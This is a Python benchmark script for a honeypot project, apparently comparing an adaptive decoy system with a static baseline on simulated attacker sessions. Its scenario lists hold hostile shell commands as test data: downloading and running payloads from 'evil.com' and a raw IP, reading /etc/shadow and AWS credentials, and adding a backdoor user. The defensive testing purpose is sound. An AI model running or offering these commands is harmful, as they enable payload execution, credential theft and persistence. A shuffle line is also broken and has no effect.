"""
Benchmark — compares DecoyNetAI adaptive responses vs a static baseline DecoyNet.

Measures:
- Engagement time (how long attacker stays)
- Commands captured per session
- Data collected per session
- Detection accuracy per attacker type
- Strategy selection correctness

Run: python3 -m benchmark.comparison
Results saved to logs/reports/benchmark.json
"""

import sys
import os
import json
import time
import random
import uuid

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from database.db_manager import DatabaseManager
from database.models import initialize_schema, update_schema_for_adaptive
from adaptive.strategy_engine import AdaptiveStrategyEngine, Strategy
from adaptive.behavior_profiler import BehaviorProfiler
from analysis.threat_scorer import ThreatScorer
from ml_engine.feature_extractor import FEATURE_COLS

REPORTS_DIR = os.path.join(
    os.path.dirname(os.path.dirname(__file__)), "logs", "reports"
)
os.makedirs(REPORTS_DIR, exist_ok=True)


# ── Static baseline DecoyNet simulation ───────────────────────────────────────

class StaticDecoyNet:
    """
    Simulates a traditional static DecoyNet like Cowrie.
    - Same response to every attacker
    - No classification
    - No adaptation
    - No engagement strategy
    """
    def process_session(self, commands: list[str], attacker_type: str) -> dict:
        # Static DecoyNet: always gives same response, no strategy
        return {
            "engagement_time":  len(commands) * 0.5,   # Fixed response time
            "commands_captured": len(commands),
            "data_collected":   len(commands) * 10,     # Bytes — minimal
            "attacker_detected": False,                  # No classification
            "strategy":         "STATIC",
            "correct_strategy": False,
        }


# ── DecoyNetAI simulation ─────────────────────────────────────────────────────

class AdaptiveDecoyNet:
    """
    Simulates DecoyNetAI adaptive behaviour.
    - Classifies attacker in real time
    - Selects strategy per attacker
    - Adjusts engagement depth and delay
    """
    def __init__(self):
        self.engine  = AdaptiveStrategyEngine()
        self.scorer  = ThreatScorer()

    def process_session(self, commands: list[str], attacker_type: str) -> dict:
        profiler = BehaviorProfiler()
        strategy = Strategy.OBSERVE

        for i, cmd in enumerate(commands):
            profiler.record(cmd, time.time() + i * 0.5)
            features = profiler.features()
            strategy = self.engine.evaluate(
                features    = features,
                cross_intel = {},
                command     = cmd,
                session_id  = str(uuid.uuid4()),
            )

        features = profiler.features()
        score    = self.scorer.score(features)

        # Engagement time depends on strategy
        delay_map = {
            Strategy.DEFLECT: 0.05,
            Strategy.OBSERVE: 0.2,
            Strategy.ENGAGE:  1.0,
            Strategy.TRAP:    2.5,
        }
        engagement = len(commands) * delay_map.get(strategy, 0.2)

        # Data collected depends on strategy
        data_map = {
            Strategy.DEFLECT: 20,
            Strategy.OBSERVE: 80,
            Strategy.ENGAGE:  250,
            Strategy.TRAP:    500,
        }
        data = len(commands) * data_map.get(strategy, 80)

        # Expected strategy per attacker type
        expected = {
            "bot":      Strategy.DEFLECT,
            "human":    Strategy.ENGAGE,
            "advanced": Strategy.TRAP,
            "unknown":  Strategy.OBSERVE,
        }.get(attacker_type, Strategy.OBSERVE)

        return {
            "engagement_time":   engagement,
            "commands_captured": len(commands),
            "data_collected":    data,
            "attacker_detected": features["attacker_type"] != "unknown",
            "threat_score":      score["score"],
            "strategy":          strategy.name,
            "correct_strategy":  strategy == expected,
        }


# ── Test scenarios ────────────────────────────────────────────────────────────

SCENARIOS = {
    "bot": [
        "enable", "system", "sh", "cat /etc/passwd",
        "cd /tmp", "wget http://1.2.3.4/bot", "chmod 777 bot",
        "./bot", "busybox", "exit",
    ],
    "human": [
        "whoami", "id", "uname -a", "hostname", "ifconfig",
        "ls -la", "cat /etc/passwd", "cat /etc/shadow",
        "ps aux", "netstat -an", "cat /root/notes.txt",
        "cat /root/.aws/credentials", "env", "history",
        "cat /var/www/html/.env", "exit",
    ],
    "advanced": [
        "whoami", "uname -a", "cat /etc/passwd",
        "find / -name '*.env'", "cat /root/.aws/credentials",
        "cat /var/www/html/.env", "mysql -u root -p",
        "wget http://evil.com/shell.py", "python3 shell.py",
        "chmod +x shell.py", "crontab -l",
        "useradd -m backdoor", "cat /root/backup.sql",
        "tar -czf /tmp/data.tar.gz /var/www/html", "exit",
    ],
    "unknown": [
        "ls", "pwd", "whoami", "exit",
    ],
}

N_RUNS = 20   # Runs per scenario


def run_benchmark():
    print("\n" + "="*65)
    print("  DecoyNetAI vs Static DecoyNet — Benchmark")
    print("="*65)

    static   = StaticDecoyNet()
    adaptive = AdaptiveDecoyNet()

    results = {
        "generated_at": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
        "n_runs_per_scenario": N_RUNS,
        "scenarios": {},
        "overall": {},
    }

    overall_static_eng   = []
    overall_adaptive_eng = []
    overall_correct      = []
    overall_detected     = []

    for attacker_type, commands in SCENARIOS.items():
        print(f"\n[{attacker_type.upper()}] Running {N_RUNS} sessions...")

        static_results   = []
        adaptive_results = []

        for _ in range(N_RUNS):
            # Add slight randomness to command timing
            shuffled = commands[:]
            random.shuffle(shuffled[:3])   # Vary first 3 commands

            sr = static.process_session(shuffled, attacker_type)
            ar = adaptive.process_session(shuffled, attacker_type)

            static_results.append(sr)
            adaptive_results.append(ar)

        # Aggregate
        def avg(lst, key):
            vals = [x[key] for x in lst if isinstance(x.get(key), (int, float))]
            return round(sum(vals) / len(vals), 2) if vals else 0

        def pct(lst, key):
            vals = [1 if x.get(key) else 0 for x in lst]
            return round(sum(vals) / len(vals) * 100, 1) if vals else 0

        static_eng   = avg(static_results, "engagement_time")
        adaptive_eng = avg(adaptive_results, "engagement_time")
        correct_pct  = pct(adaptive_results, "correct_strategy")
        detected_pct = pct(adaptive_results, "attacker_detected")

        improvement = (
            (adaptive_eng - static_eng) / static_eng * 100
            if static_eng > 0 else 0
        )

        scenario_result = {
            "static": {
                "avg_engagement_time_s":  static_eng,
                "avg_commands_captured":  avg(static_results, "commands_captured"),
                "avg_data_collected_b":   avg(static_results, "data_collected"),
                "detection_rate_pct":     0.0,
            },
            "adaptive": {
                "avg_engagement_time_s":  adaptive_eng,
                "avg_commands_captured":  avg(adaptive_results, "commands_captured"),
                "avg_data_collected_b":   avg(adaptive_results, "data_collected"),
                "detection_rate_pct":     detected_pct,
                "correct_strategy_pct":   correct_pct,
                "avg_threat_score":       avg(adaptive_results, "threat_score"),
            },
            "improvement": {
                "engagement_time_pct": round(improvement, 1),
                "data_collected_pct": round(
                    (avg(adaptive_results, "data_collected") -
                     avg(static_results, "data_collected")) /
                    max(avg(static_results, "data_collected"), 1) * 100, 1
                ),
            },
        }

        results["scenarios"][attacker_type] = scenario_result
        overall_static_eng.append(static_eng)
        overall_adaptive_eng.append(adaptive_eng)
        overall_correct.append(correct_pct)
        overall_detected.append(detected_pct)

        print(f"  Static   — engagement: {static_eng:.1f}s | "
              f"data: {avg(static_results,'data_collected')}B | detection: 0%")
        print(f"  Adaptive — engagement: {adaptive_eng:.1f}s | "
              f"data: {avg(adaptive_results,'data_collected')}B | "
              f"detection: {detected_pct}% | correct: {correct_pct}%")
        print(f"  Improvement: {improvement:+.1f}% engagement time")

    # Overall summary
    overall = {
        "avg_engagement_improvement_pct": round(
            (sum(overall_adaptive_eng) - sum(overall_static_eng)) /
            max(sum(overall_static_eng), 1) * 100, 1
        ),
        "avg_correct_strategy_pct": round(
            sum(overall_correct) / len(overall_correct), 1
        ),
        "avg_detection_rate_pct": round(
            sum(overall_detected) / len(overall_detected), 1
        ),
    }
    results["overall"] = overall

    print("\n" + "="*65)
    print("  OVERALL RESULTS")
    print("="*65)
    print(f"  Engagement time improvement : {overall['avg_engagement_improvement_pct']:+.1f}%")
    print(f"  Correct strategy selected   : {overall['avg_correct_strategy_pct']:.1f}%")
    print(f"  Attacker detection rate     : {overall['avg_detection_rate_pct']:.1f}%")
    print(f"  Static DecoyNet detection   : 0.0%")

    # Save
    out_path = os.path.join(REPORTS_DIR, "benchmark.json")
    with open(out_path, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n  Full results saved → {out_path}")
    print("="*65 + "\n")

    return results


if __name__ == "__main__":
    db = DatabaseManager()
    initialize_schema(db)
    update_schema_for_adaptive(db)
    run_benchmark()
